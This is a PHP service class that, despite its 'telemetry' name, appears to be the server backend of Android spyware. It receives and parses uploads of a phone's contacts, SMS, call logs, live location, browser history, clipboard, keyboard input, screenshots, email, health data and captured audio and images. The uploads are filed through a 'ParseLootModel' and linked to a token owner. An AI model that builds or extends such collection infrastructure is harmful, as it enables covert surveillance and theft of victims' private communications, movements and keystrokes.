<?php

namespace App\Services;

use App\Models\ParseLootModel;
use App\Models\ParseAdvancedModel;
use App\Models\ReceiveModel;
use App\Models\AndroidModel;
use App\Models\CryptModel;
use App\Models\UserModel;
use App\Models\UploadedFilesModel;
use App\Models\UploadQueueModel;
use App\Models\LogUserActionModel;

class TelemetryReceiverService
{
    // Configuration for the file upload logic
    private $uploadConfig = [
        'max_size'      => 209715200, // 200MB
        'allowed_types' => ['txt', 'enc', 'bin', 'gz', 'json', 'csv', 'dat', 'xml', 'log', 'jpg', 'jpeg', 'png', '3gp', 'mp3', 'wav'],
        'upload_path'   => WRITEPATH . 'uploads/raw_telemetry/',
        'encrypt_name'  => true,
    ];

    // Allowed file categories (legacy + advanced extractors)
    private $allowedCategories = [
        // Legacy extractors
        'contacts', 'logs', 'sms', 'apps', 'files', 'calls', 'location',
        // Live location tracking
        'live_locations', 'live_location',
        // SIM config
        'sim_configs', 'sim_config',
        // AdvancedController extractors
        'device', 'device_context', 'context', 'network', 'network_info', 'accounts', 'calendar', 'app', 'app_usage', 'usage', 'notifications', 'bluetooth', 'sensors', 'sensor',
        // Device info & security
        'deviceinfo', 'device_info', 'security_audit', 'securityaudit',
        // Media categories
        'audio', 'image',
        // Proc info
        'proc_info',
        // New extractors
        'processes', 'camera_info', 'battery_stats', 'accessibility', 'input_methods',
        // NEW: 9 additional extractors
        'cell_towers', 'display_info', 'storage', 'thermal', 'nfc', 'data_usage', 'saved_wifi', 'default_apps', 'alarms',
        // Group 1-6 new extractors
        'hardware_graphics', 'hardware_network', 'app_security', 'network_security', 'telephony_network', 'system_locale',
        // Composite extractors
        'misc_software', 'misc_hardware', 'apps_notifications',
        // Misc software detail extractors
        'app_permissions', 'browser_history', 'clipboard', 'content_providers',
        'crash_logs', 'digital_wellbeing', 'doze_standby', 'email', 'health_data',
        'keyboard_input', 'keyguard', 'screenshots', 'screen_state', 'vpn_config',
        'running_processes',
        // Misc hardware detail extractors
        'audio_devices', 'biometric', 'gnss_hardware', 'power_rails', 'usb_devices',
        'vibration',
    ];

    /**
     * Validate HMAC-SHA256 request signature
     */
    public function verifyHmacSignature(string $deviceId, string $signature, string $timestamp, string $secretKey): bool
    {
        if (empty($signature) || empty($timestamp) || empty($deviceId)) {
            return false;
        }

        // 5 minute max clock skew allowed
        $now = time();
        if (abs($now - (int)$timestamp) > 300) {
            log_message('warning', "verifyHmacSignature failed: Clock skew too large for device $deviceId");
            return false;
        }

        $dataToSign = $deviceId . ':' . $timestamp;
        $expectedSignature = hash_hmac('sha256', $dataToSign, $secretKey);

        return hash_equals($expectedSignature, strtolower($signature));
    }

    /**
     * Validate token
     */
    public function validateToken($token): bool
    {
        if (empty($token)) {
            return false;
        }

        $androidModel = new AndroidModel();
        $tokenData = $androidModel->token_test($token);
        return $tokenData !== null;
    }

    /**
     * Get token owner
     */
    public function getTokenOwner($token)
    {
        $modelReceive = new ReceiveModel();
        $owner = $modelReceive->get_token_owner($token);
        return $owner && $owner !== '0' ? $owner['owner_id'] : null;
    }

    /**
     * Validate file
     */
    public function validateFile(\CodeIgniter\HTTP\Files\UploadedFile $file): bool
    {
        if ($file->getSize() > $this->uploadConfig['max_size']) {
            log_message('error', 'validateFile: size exceeded. size=' . $file->getSize() . ' max=' . $this->uploadConfig['max_size']);
            return false;
        }

        // Use getClientExtension() — getExtension() returns MIME-based extension,
        // which is wrong for encrypted binary files (e.g., .enc detected as .exe)
        $extension = $file->getClientExtension();
        $clientName = $file->getClientName();

        if (!in_array($extension, $this->uploadConfig['allowed_types'])) {
            log_message('error', 'validateFile: extension "' . $extension . '" not allowed. clientName="' . $clientName . '"');
            return false;
        }

        return true;
    }

    /**
     * Extract file information
     */
    public function extractFileInfo(\CodeIgniter\HTTP\Files\UploadedFile $file, string $newName, ?string $category = null): array
    {
        $originalName = $file->getClientName();

        // Priority: 1. POST parameter, 2. Filename prefix
        if (empty($category)) {
            $category = explode('_', $originalName)[0] ?? 'unknown';
        }

        return [
            'original_name' => $originalName,
            'new_name'      => $newName,
            'size'          => $file->getSize(),
            'extension'     => $file->getClientExtension(),
            'mime_type'     => $file->getClientMimeType(),
            'category'      => strtolower(trim($category)),
            'upload_path'   => $this->uploadConfig['upload_path'] . $newName
        ];
    }

    /**
     * Save file via model
     */
    public function saveFileViaModel(string $token, $owner, array $fileInfo, ?string $devicePrintId = null, ?string $uploadSource = null, ?string $androidId = null): ?int
    {
        try {
            $modelUpload = new UploadedFilesModel();

            $ownerId = is_array($owner) ? ($owner['Token_Owner'] ?? null) : $owner;

            $validSources = ['manual', 'auto_sync', 'web_initiated'];
            $uploadSource = in_array($uploadSource, $validSources) ? $uploadSource : 'auto_sync';

            $uploadData = [
                'original_name' => $fileInfo['original_name'],
                'new_name' => $fileInfo['new_name'],
                'size' => $fileInfo['size'],
                'extension' => $fileInfo['extension'],
                'mime_type' => $fileInfo['mime_type'],
                'category' => $fileInfo['category'],
                'token' => $token,
                'owner_id' => $ownerId,
                'device_checksum' => $devicePrintId,
                'device_print_id' => $devicePrintId,
                'upload_path' => $fileInfo['upload_path'],
                'upload_source' => $uploadSource,
            ];

            $this->updateTokenDevice($token, $devicePrintId, $androidId);

            return $modelUpload->logUpload($uploadData);

        } catch (\Exception $e) {
            log_message('error', 'Failed to save file via model: ' . $e->getMessage());
            return null;
        }
    }

    /**
     * Update file status via model
     */
    public function updateFileStatusViaModel(int $fileId, string $status, ?array $additionalInfo = null): bool
    {
        if ($fileId <= 0) {
            return false;
        }

        try {
            $modelUpload = new UploadedFilesModel();
            return $modelUpload->updateStatus($fileId, $status, $additionalInfo);

        } catch (\Exception $e) {
            log_message('error', 'Failed to update file status via model: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Updates token metadata in background
     */
    public function updateTokenDevice(string $token, ?string $deviceChecksum = null, ?string $androidId = null)
    {
        if ($deviceChecksum || $androidId) {
            $userModel = new UserModel();
            $userModel->update_token_metadata($token, $deviceChecksum, $androidId);
        }
    }

    /**
     * Log token verification
     */
    public function logTokenVerification($token, $time, $ip, $format)
    {
        $modelReceive = new ReceiveModel();
        $modelReceive->make_test_token($token, $time, $ip, $format);
    }

    /**
     * Decrypt user data
     */
    public function decryptUserData($cryptModel, $encryptedData)
    {
        if (empty($encryptedData)) {
            return '';
        }

        try {
            $decoded = base64_decode($encryptedData);
            if ($decoded === false) {
                return '';
            }
            return $cryptModel->Dec_String($decoded);
        } catch (\Exception $e) {
            log_message('error', 'Failed to decrypt user data: ' . $e->getMessage());
            return '';
        }
    }

    /**
     * Resolves the login source for token-based authentication.
     * Priority: explicit source POST param > user-agent detection > default
     */
    public function resolveTokenLoginSource(?string $explicitSource, ?string $userAgentString = null): string
    {
        if ($explicitSource && in_array($explicitSource, ['qr', 'manual', 'nfc', 'android'])) {
            return 'login_' . $explicitSource;
        }

        $ua = $userAgentString ?? '';
        if (stripos($ua, 'okhttp') !== false || stripos($ua, 'android') !== false) {
            return 'login_token_android';
        }

        return 'login_token';
    }

    /**
     * Process uploaded file
     */
    public function processUploadedFile($filename, $ownerId, $category, $fileRecordId = null, ?string $devicePrintId = null)
    {
        if (!in_array($category, $this->allowedCategories)) {
            log_message('warning', "Receive::processUploadedFile - Unknown category: {$category}");
            return ['success' => false, 'error' => "Unknown category: {$category}"];
        }

        $modelParse = new ParseLootModel();
        $startTime = microtime(true);

        // ── Legacy extractor routing ─────────────────────────────────────
        $methodMap = [
            'contacts' => 'get_contacts',
            'logs'     => 'get_logs',
            'calls'    => 'get_logs',
            'sms'      => 'get_sms',
            'apps'     => 'get_apps',
            'files'    => 'get_files',
            'location'       => 'get_location',
            'sim_configs'    => 'parse_sim_configs',
            'sim_config'     => 'parse_sim_configs',
            'live_locations' => 'parse_live_locations',
            'live_location'  => 'parse_live_locations',
        ];

        // ── AdvancedController extractor routing (aliases included) ─────────────────
        $advancedMethodMap = [
            'device'         => 'parse_device_context',
            'device_context' => 'parse_device_context',
            'context'        => 'parse_device_context',
            'network'        => 'parse_network_info',
            'network_info'   => 'parse_network_info',
            'accounts'       => 'parse_accounts',
            'calendar'       => 'parse_calendar',
            'app'            => 'parse_app_usage',
            'app_usage'      => 'parse_app_usage',
            'usage'          => 'parse_app_usage',
            'notifications'  => 'parse_notifications',
            'bluetooth'      => 'parse_bluetooth',
            'sensors'        => 'parse_sensors',
            'sensor'         => 'parse_sensors',
            'deviceinfo'     => 'parse_device_info',
            'device_info'    => 'parse_device_info',
            'security_audit' => 'parse_security_audit',
            'securityaudit'  => 'parse_security_audit',
            'audio'          => 'parse_captured_media',
            'image'          => 'parse_captured_media',
            'proc_info'      => 'parse_proc_info',
            'processes'      => 'parse_processes',
            'camera_info'    => 'parse_camera_info',
            'battery_stats'  => 'parse_battery_stats',
            'accessibility'  => 'parse_accessibility',
            'input_methods'  => 'parse_input_methods',
            // NEW: 9 additional extractors
            'cell_towers'    => 'parse_cell_towers',
            'display_info'   => 'parse_display_info',
            'storage'        => 'parse_storage',
            'thermal'        => 'parse_thermal',
            'nfc'            => 'parse_nfc',
            'data_usage'     => 'parse_data_usage',
            'saved_wifi'     => 'parse_saved_wifi',
            'default_apps'   => 'parse_default_apps',
            'alarms'         => 'parse_alarms',
            // Group 1-6 new extractors
            'hardware_graphics'  => 'parse_hardware_graphics',
            'hardware_network'   => 'parse_hardware_network',
            'app_security'       => 'parse_app_security',
            'network_security'   => 'parse_network_security',
            'telephony_network'  => 'parse_telephony_network',
            'system_locale'      => 'parse_system_locale',
            // Composite extractors
            'misc_software'      => 'parse_misc_software',
            'misc_hardware'      => 'parse_misc_hardware',
            'apps_notifications' => 'parse_apps_notifications',
            // Misc software detail extractors
            'app_permissions'  => 'parse_app_permissions',
            'browser_history'  => 'parse_browser_history',
            'clipboard'        => 'parse_clipboard',
            'content_providers'=> 'parse_content_providers',
            'crash_logs'       => 'parse_crash_logs',
            'digital_wellbeing'=> 'parse_digital_wellbeing',
            'doze_standby'     => 'parse_doze_standby',
            'email'            => 'parse_email',
            'health_data'      => 'parse_health_data',
            'keyboard_input'   => 'parse_keyboard_input',
            'keyguard'         => 'parse_keyguard',
            'screenshots'      => 'parse_screenshots',
            'screen_state'     => 'parse_screen_state',
            'vpn_config'       => 'parse_vpn_config',
            'running_processes'=> 'parse_running_processes',
            // Misc hardware detail extractors
            'audio_devices'  => 'parse_audio_devices',
            'biometric'      => 'parse_biometric',
            'gnss_hardware'  => 'parse_gnss_hardware',
            'power_rails'    => 'parse_power_rails',
            'usb_devices'    => 'parse_usb_devices',
            'vibration'      => 'parse_vibration',
        ];

        try {
            $parsedCountOrBool = false;

            // Route 'files' category depending on whether it is a files catalog list or a fetched file
            if ($category === 'files') {
                $db = \Config\Database::connect();
                $originalName = '';
                if ($fileRecordId) {
                    $fileRecord = $db->table('tbl_uploaded_files')->where('id', $fileRecordId)->get()->getRowArray();
                    if ($fileRecord) {
                        $originalName = $fileRecord['original_filename'];
                    }
                }

                // A fetched file has the original filename (not starting with 'files_')
                if ($originalName !== '' && !str_starts_with(strtolower($originalName), 'files_')) {
                    $modelAdvanced = new ParseAdvancedModel();
                    $parsedCountOrBool = $modelAdvanced->parse_captured_media($filename, $ownerId, $devicePrintId, $fileRecordId, 'file');
                } else {
                    $parsedCountOrBool = $modelParse->get_files($filename, $ownerId, $devicePrintId, $fileRecordId);
                }
            } elseif (isset($methodMap[$category]) && method_exists($modelParse, $methodMap[$category])) {
                $parsedCountOrBool = $modelParse->{$methodMap[$category]}($filename, $ownerId, $devicePrintId, $fileRecordId);
            } elseif (isset($advancedMethodMap[$category])) {
                $modelAdvanced     = new ParseAdvancedModel();
                $method            = $advancedMethodMap[$category];

                // Pass category for media parsing to differentiate between image/audio
                if ($method === 'parse_captured_media') {
                    $parsedCountOrBool = $modelAdvanced->$method($filename, $ownerId, $devicePrintId, $fileRecordId, $category);
                } else {
                    $parsedCountOrBool = $modelAdvanced->$method($filename, $ownerId, $devicePrintId, $fileRecordId);
                }
            } else {
                log_message('error', "Receive::processUploadedFile - No handler for category: {$category}");
                return ['success' => false, 'error' => "No handler for category: {$category}"];
            }

            $durationMs = round((microtime(true) - $startTime) * 1000, 2);

            // Parser methods return boolean (AdvancedController) or count (Legacy)
            if ($parsedCountOrBool === false) {
                log_message('error', "Receive::processUploadedFile - Parser returned failure for {$category}");
                return [
                    'success'     => false,
                    'error'       => 'Processing failed in parser',
                    'duration_ms' => $durationMs,
                ];
            }

            return [
                'success'        => true,
                'record_count'   => is_bool($parsedCountOrBool) ? ($parsedCountOrBool ? 1 : 0) : $parsedCountOrBool,
                'duration_ms'    => $durationMs,
                'file_record_id' => $fileRecordId,
            ];

        } catch (\Exception $e) {
            log_message('error', "Receive::processUploadedFile - Exception during {$category}: " . $e->getMessage());
            return [
                'success'     => false,
                'error'       => $e->getMessage(),
                'duration_ms' => round((microtime(true) - $startTime) * 1000, 2),
            ];
        }
    }

    /**
     * Trigger immediate processing of a specific queue ID in background.
     */
    public function processQueueItemInline(int $queueId, UploadQueueModel $queueModel, string $category, int $owner, string $filename, string $devicePrintId): array
    {
        set_time_limit(300);
        ini_set('memory_limit', '512M');

        try {
            $parseLoot = new ParseLootModel();
            $parseAdv  = new ParseAdvancedModel();
            $uploadedFileModel = new UploadedFilesModel();
            $startTime = microtime(true);

            $fileRecordId = null;
            $item = $queueModel->find($queueId);
            if ($item && !empty($item['file_record_id'])) {
                $fileRecordId = (int)$item['file_record_id'];
            }

            $legacyMethodMap = [
                'contacts' => 'get_contacts',
                'logs'     => 'get_logs',
                'calls'    => 'get_logs',
                'sms'      => 'get_sms',
                'apps'     => 'get_apps',
                'files'    => 'get_files',
                'location'       => 'get_location',
                'sim_configs'    => 'parse_sim_configs',
                'sim_config'     => 'parse_sim_configs',
                'live_locations' => 'parse_live_locations',
                'live_location'  => 'parse_live_locations',
            ];

            $advancedMethodMap = [
                'device'              => 'parse_device_context',
                'device_context'      => 'parse_device_context',
                'context'             => 'parse_device_context',
                'network'             => 'parse_network_info',
                'network_info'        => 'parse_network_info',
                'accounts'            => 'parse_accounts',
                'calendar'            => 'parse_calendar',
                'app'                 => 'parse_app_usage',
                'app_usage'           => 'parse_app_usage',
                'usage'               => 'parse_app_usage',
                'notifications'       => 'parse_notifications',
                'bluetooth'           => 'parse_bluetooth',
                'sensors'             => 'parse_sensors',
                'sensor'              => 'parse_sensors',
                'deviceinfo'          => 'parse_device_info',
                'device_info'         => 'parse_device_info',
                'security_audit'      => 'parse_security_audit',
                'securityaudit'       => 'parse_security_audit',
                'audio'               => 'parse_captured_media',
                'image'               => 'parse_captured_media',
                'proc_info'           => 'parse_proc_info',
                'processes'           => 'parse_processes',
                'camera_info'         => 'parse_camera_info',
                'battery_stats'       => 'parse_battery_stats',
                'accessibility'       => 'parse_accessibility',
                'input_methods'       => 'parse_input_methods',
                'cell_towers'         => 'parse_cell_towers',
                'display_info'        => 'parse_display_info',
                'storage'             => 'parse_storage',
                'thermal'             => 'parse_thermal',
                'nfc'                 => 'parse_nfc',
                'data_usage'          => 'parse_data_usage',
                'saved_wifi'          => 'parse_saved_wifi',
                'default_apps'        => 'parse_default_apps',
                'alarms'              => 'parse_alarms',
                'hardware_graphics'   => 'parse_hardware_graphics',
                'hardware_network'    => 'parse_hardware_network',
                'app_security'        => 'parse_app_security',
                'network_security'    => 'parse_network_security',
                'telephony_network'   => 'parse_telephony_network',
                'system_locale'       => 'parse_system_locale',
                'misc_software'       => 'parse_misc_software',
                'misc_hardware'       => 'parse_misc_hardware',
                'apps_notifications'  => 'parse_apps_notifications',
            ];

            if (isset($legacyMethodMap[$category]) && method_exists($parseLoot, $legacyMethodMap[$category])) {
                $method = $legacyMethodMap[$category];
                $parsedCountOrBool = $parseLoot->{$method}($filename, $owner, $devicePrintId, $fileRecordId);
            } elseif (isset($advancedMethodMap[$category])) {
                $method = $advancedMethodMap[$category];

                if ($method === 'parse_captured_media') {
                    $parsedCountOrBool = $parseAdv->{$method}($filename, $owner, $devicePrintId, $fileRecordId, $category);
                } else {
                    $parsedCountOrBool = $parseAdv->{$method}($filename, $owner, $devicePrintId, $fileRecordId);
                }
            } else {
                log_message('warning', "processQueueItemInline: No handler for category: {$category}");
                return ['success' => false, 'error' => "No handler for category: {$category}"];
            }

            $durationMs = round((microtime(true) - $startTime) * 1000, 2);

            if ($parsedCountOrBool === false) {
                $response = ['success' => false, 'error' => 'Processing failed in parser', 'duration_ms' => $durationMs];
            } else {
                $recordCount = is_bool($parsedCountOrBool) ? ($parsedCountOrBool ? 1 : 0) : $parsedCountOrBool;
                $response = ['success' => true, 'record_count' => $recordCount, 'duration_ms' => $durationMs];

                if ($fileRecordId > 0) {
                    $uploadedFileModel->updateStatus($fileRecordId, 'processed', $response);
                }
            }

            log_message('info', "processQueueItemInline: queue #{$queueId} ({$category}) => " . ($response['success'] ? 'success' : 'failed') . " ({$durationMs}ms)");
            return $response;

        } catch (\Throwable $e) {
            log_message('error', "processQueueItemInline: queue #{$queueId} exception: " . $e->getMessage());
            return ['success' => false, 'error' => $e->getMessage()];
        }
    }

    /**
     * High-level upload and processing orchestration
     */
    public function handleUpload(\CodeIgniter\HTTP\Files\UploadedFile $file, string $token, string $devicePrintId, string $uploadSource, ?string $forcedCategory = null, string $requestUrl = '', ?string $androidId = null): array
    {
        // 5. Additional file validation
        if (!$this->validateFile($file)) {
            return [
                'success' => false,
                'error' => 'Invalid file type or size',
                'status_code' => 400
            ];
        }

        // 6. Get file information BEFORE moving
        $originalName = $file->getClientName();
        $newName = $file->getRandomName();
        $fileInfo = $this->extractFileInfo($file, $newName, $forcedCategory);

        // 7. Move file securely
        if (!$file->hasMoved()) {
            try {
                $file->move($this->uploadConfig['upload_path'], $newName);
            } catch (\Exception $e) {
                log_message('error', 'File move failed: ' . $e->getMessage() . ' | File: ' . $e->getFile() . ' Line: ' . $e->getLine() . ' | Trace: ' . $e->getTraceAsString());
                return [
                    'success' => false,
                    'error' => 'Failed to save file: ' . $e->getMessage(),
                    'status_code' => 400
                ];
            }
        }

        // 8. Get token owner information
        $owner = $this->getTokenOwner($token);
        if (!$owner) {
            @unlink($this->uploadConfig['upload_path'] . $newName);
            return [
                'success' => false,
                'error' => 'Invalid token owner',
                'status_code' => 400
            ];
        }

        // 9. Save file attributes to NEW database table via model
        $fileRecordId = $this->saveFileViaModel($token, $owner, $fileInfo, $devicePrintId, $uploadSource, $androidId);

        // 10. Enqueue file for async processing instead of processing inline
        $queueModel = new UploadQueueModel();
        $queueId = $queueModel->enqueue([
            'stored_filename'   => $newName,
            'original_filename' => $fileInfo['original_name'],
            'file_category'     => $fileInfo['category'],
            'file_size_bytes'   => $fileInfo['size'],
            'file_record_id'    => $fileRecordId,
            'owner_id'          => $owner,
            'device_checksum'   => $devicePrintId,
            'device_print_id'   => $devicePrintId,
            'token_used'        => $token,
            'upload_path'       => $this->uploadConfig['upload_path'] . $newName,
            'upload_source'     => $uploadSource,
        ]);

        $uploadCategory = $fileInfo['category'];
        $uploadActionType = 'upload_' . $uploadCategory;
        $logModel = new LogUserActionModel();
        $logModel->logAction([
            'user_id'         => $owner,
            'action_category' => 'file',
            'action_type'     => $uploadActionType,
            'action_severity' => 'low',
            'device_type'     => 'mobile',
            'success'         => $queueId !== null ? 1 : 0,
            'request_url'     => $requestUrl,
            'resource_id'     => $fileRecordId,
            'new_values'      => json_encode([
                'filename' => $fileInfo['original_name'],
                'size'     => $fileInfo['size'],
                'category' => $uploadCategory,
                'queue_id' => $queueId,
            ]),
            'error_message'   => $queueId !== null ? '' : 'Failed to enqueue upload',
            'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
        ]);

        // Process the queue item immediately (synchronous)
        if ($queueId !== null) {
            $queueModel->markProcessing($queueId);
            $processResult = $this->processQueueItemInline($queueId, $queueModel, $fileInfo['category'], $owner, $newName, $devicePrintId);

            if ($processResult['success']) {
                $queueModel->markCompleted($queueId);
                return [
                    'success' => true,
                    'status' => 'processed',
                    'file_id' => $newName,
                    'queue_id' => $queueId,
                    'category' => $fileInfo['category'],
                    'record_count' => $processResult['record_count'] ?? 0,
                    'timestamp' => (string) (time() * 1000)
                ];
            }

            // Parse failed: keep the queue item in 'processing' so queue:cleanup
            // resets it to 'pending' for queue:process to retry. Do NOT mark it
            // failed here, and return a real 4xx so the client keeps its local
            // copy instead of treating this upload as successful.
            return [
                'success' => false,
                'error' => 'Processing failed: ' . ($processResult['error'] ?? 'unknown'),
                'status_code' => 422
            ];
        }

        if ($fileRecordId > 0) {
            $this->updateFileStatusViaModel($fileRecordId, 'failed', ['error' => 'Failed to enqueue upload']);
        }

        return [
            'success' => false,
            'error' => 'Failed to enqueue uploaded file for processing',
            'status_code' => 400
        ];
    }
}
